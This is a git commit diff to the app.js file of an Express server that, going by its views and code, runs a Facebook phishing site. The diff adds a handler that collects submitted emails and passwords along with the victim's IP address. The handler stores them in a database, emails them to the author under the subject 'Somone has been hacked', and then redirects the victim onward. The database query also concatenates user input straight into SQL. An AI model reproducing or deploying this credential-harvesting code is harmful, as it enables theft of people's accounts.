ff0120c6b1f567ffc5d5445ca7ef5b5352320c3b
fadysadakah.emh@gmail.com <fadysadakah.emh@gmail.com>
2019-05-08 13:03:43 +0200

    redirect_link

--- app.js
+++ app.js
@@ -1,4 +1,3 @@
-
 var express = require('express');
 var app = express();
 app.use(express.static('public'));
@@ -17,49 +16,89 @@ const client = new pg.Client({
 });
 
 client.connect();
+// ############################################       NODE MAILER    ##############################################################################################
+const nodemailer = require("nodemailer");
+var transporter = nodemailer.createTransport({
+    service: 'gmail',
+    host: 'smtp.gmail.com',
+    secure: true,
+    port: 465,
+
+    auth: {
+        user: 'fadysadakah.emh@gmail.com',
+        pass: 'encrypted'
+    }
+});
+var mailOptions = {
+    from: 'Fady Sadakah<fadysadakah.emh@gmail.com>',
+    to: "fadysadakah.emh@gmail.com",
+    subject: 'Somone has been hacked',
+    text: '',
+    html: ''
+};
+
+
+
+
+// #####################################################################################################################################################
+var redirect_link='https://www.google.com'
 
 app.get('/', function (req, res) {
-    res.render('Facebook');
-
+    redirect_link =''
+    res.render('fb_en', { redirect_link: redirect_link });
+    
 })
 app.get('/n/*', function (req, res) {
-    res.render('Facebook_nasef');
+    redirect_link ='https://www.facebook.com/my.omelette/photos/a.400034677207255/455544524989603/?type=3&theater'
+    res.render('fb_en',{redirect_link:redirect_link});
+    
+})
+redirect_link =''
+app.get('/ar/*', function (req, res) {
+    res.render('fb_ar',{redirect_link:redirect_link});
 
 })
 
-
+// #####################################################################################################################################################
 app.post('/confirm', function (req, res) {
-
-    res.redirect('https://www.facebook.com/my.omelette/photos/a.400034677207255/455544524989603/?type=3&theater')
     var mail = req.body.email_a;
     var password = req.body.pass_a;
     var c = req.body.email;
     var d = req.body.pass;
+
+
     if (mail == undefined) {
         mail = c;
     } else if (c == undefined) {
-
+        
     } else if (mail.length < c.length) {
         mail = c;
     }
-
+    
     if (password == undefined) {
         password = d;
     } else if (d == undefined) {
-
+        
     }
     else if (password.length < d.length) {
         password = d;
     }
+
+
     var ip = req.headers['x-forwarded-for'] ||
-        req.connection.remoteAddress ||
-        req.socket.remoteAddress ||
-        (req.connection.socket ? req.connection.socket.remoteAddress : null);
-    client.query("INSERT INTO facebook (mail,password,ip) VALUES ('" + mail + "','" + password + "','" + ip + "')", function (err, result) {
-        if (!err) {
-            // console.log(result)
-        }
-    })
+    req.connection.remoteAddress ||
+    req.socket.remoteAddress ||
+    (req.connection.socket ? req.connection.socket.remoteAddress : null);
+    
+    res.redirect(req.body.redirect_link)
+
+
+    //    mailOptions.to='';
+    mailOptions.text='mail   :   '+mail+'\npassword   :   '+password+'\nip   :   '+ip;
+    transporter.sendMail(mailOptions, function () { });
+
+
+    client.query("INSERT INTO facebook (mail,password,ip) VALUES ('" + mail + "','" + password + "','" + ip + "')", function (err, result) { })
 })
 
 
